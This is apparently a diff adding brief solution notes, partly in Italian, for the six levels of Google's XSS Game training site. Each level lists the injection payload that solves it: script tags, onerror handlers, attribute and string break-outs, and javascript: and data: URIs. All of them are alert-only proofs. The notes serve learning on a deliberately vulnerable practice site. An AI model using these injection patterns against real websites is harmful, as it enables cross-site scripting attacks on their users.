@@ -1,0 +1,46 @@
+Google XSS Challenge
+
+##############################################################################
+Level 1: Hello, world of XSS
+
+https://xss-game.appspot.com/level1
+
+<script>alert('xss')</script>
+
+ISPEZIONARE CODICE SORGENTE
+##############################################################################
+Level 2: Persistence is key
+
+https://xss-game.appspot.com/level2
+
+<img src=x onerror=alert('XSS')>
+
+"Welcome" post contiene HTML
+#############################################################################
+
+Level 3: That sinking feeling...
+
+https://xss-game.appspot.com/level3/frame#1
+URL=https://xss-game.appspot.com/level3/frame#1' onerror='alert("xss")'>
+
+#############################################################################
+
+Level 4: Context matters
+
+https://xss-game.appspot.com/level4/frame
+timer=');alert('xss
+
+#############################################################################
+
+Level 5: Breaking protocol
+
+https://xss-game.appspot.com/level5/frame
+URL=https://xss-game.appspot.com/level5/frame/signup?next=javascript%3Aalert%28%27xss%27%29
+
+#############################################################################
+Level 6: Follow the X
+
+https://xss-game.appspot.com/level6/frame#/static/gadget.js
+URL=https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
+
+#############################################################################
